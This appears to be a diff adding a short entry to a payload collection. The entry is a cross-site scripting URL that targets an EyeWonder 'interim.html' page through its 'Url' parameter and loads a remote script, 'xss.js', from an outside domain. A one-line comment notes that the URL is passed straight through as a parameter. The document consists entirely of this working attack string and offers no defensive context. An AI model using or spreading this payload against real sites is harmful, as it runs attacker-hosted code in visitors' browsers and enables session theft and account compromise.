@@ -1,0 +1,3 @@
+/eyewonder/interim.html?Url=https://bgtian.life/xss.js
+
+url injected is simply pass as param
